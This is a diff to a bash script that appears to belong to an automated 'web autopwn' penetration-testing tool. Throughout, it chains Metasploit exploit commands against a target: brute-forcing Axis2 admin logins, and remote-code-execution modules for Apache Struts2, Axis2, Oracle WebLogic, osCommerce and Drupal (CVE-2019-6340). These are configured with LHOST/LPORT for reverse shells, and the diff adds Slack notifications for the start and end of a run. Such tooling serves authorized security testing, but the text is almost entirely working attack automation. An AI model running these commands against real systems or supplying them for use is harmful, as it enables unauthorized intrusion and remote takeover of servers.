@@ -1,3 +1,6 @@
+      if [ "$SLACK_NOTIFICATIONS" == "1" ]; then
+            /usr/bin/python "$INSTALL_DIR/bin/slack.py" "Running web autopwn: $TARGET $MODE `date +"%Y-%m-%d %H:%M"`"
+      fi
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -37,7 +40,7 @@
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING JENKINS ENUMERATION $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/jenkins_enum; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; set TARGETURI /; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-tomcat_mgr_login.raw
+      msfconsole -q -x "use scanner/http/jenkins_enum; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; set TARGETURI /; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-jenkins_enum.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -100,6 +103,40 @@
       msfconsole -q -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/htp/phpmyadmin_preg_replace; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-phpmyadmin_3522_backdoor.raw 2> /dev/null
+
+
+
+
+
+
+
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING AXIS2 ADMIN BRUTE FORCE SCANNER $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/axis_login; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg USERNAME admin; setg PASS_FILE "$PASS_FILE"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-axis_login.raw 2> /dev/null
+
+
+
+
+
+
+
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING AXIS2 AUTHENTICATED DEPLOYER RCE $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use multi/http/axis2_deployer; setg RHOSTS "$TARGET"; set FingerprintCheck false; setg RPORT "$PORT"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-axis2_deployer.raw 2> /dev/null
+
+
+
+
+
+
+
+
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING JOOMLA COMFIELDS SQL INJECTION METASPLOIT CVE-2017-8917 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -121,19 +158,19 @@
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA OGNL INJECTION CVE-2017-5638 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use multi/http/struts2_content_type_ognl; setg RHOST "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw
+      msfconsole -q -x "use multi/http/struts2_content_type_ognl; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; set TARGETURI /orders/3; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_content_type_ognl.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING APACHE STRUTS 2 SHOWCASE OGNL RCE CVE-2017-9805 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw
+      msfconsole -q -x "use exploit/multi/http/struts2_rest_xstream; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; set TARGETURI /orders/3; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_rest_xstream.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING APACHE STRUTS 2 REST XSTREAM RCE CVE-2017-9791 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw
+      msfconsole -q -x "use exploit/multi/http/struts2_code_exec_showcase; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; set TARGETURI /orders/3; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-struts2_code_exec_showcase.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -163,7 +200,7 @@
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING ORACLE WEBLOGIC SERVER DESERIALIZATION RCE CVE-2018-2628 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/multi/misc/weblogic_deserialize; setg RHOST "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw
+      msfconsole -q -x "use exploit/multi/misc/weblogic_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-weblogic_deserialize.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -172,3 +209,13 @@
       msfconsole -q -x "use exploit/multi/http/oscommerce_installer_unauth_code_exec; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-oscommerce_installer_unauth_code_exec.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING DRUPAL REST UNSERIALIZE CVE-2019-6340 $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use unix/webapp/drupal_restws_unserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; setg URI /drupal/; setg TARGETURI /drupal/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw 2> /dev/null
+      if [ "$SLACK_NOTIFICATIONS" == "1" ]; then
+            /usr/bin/python "$INSTALL_DIR/bin/slack.py" "Finished web autopwn: $TARGET $MODE `date +"%Y-%m-%d %H:%M"`"
+      fi
+      
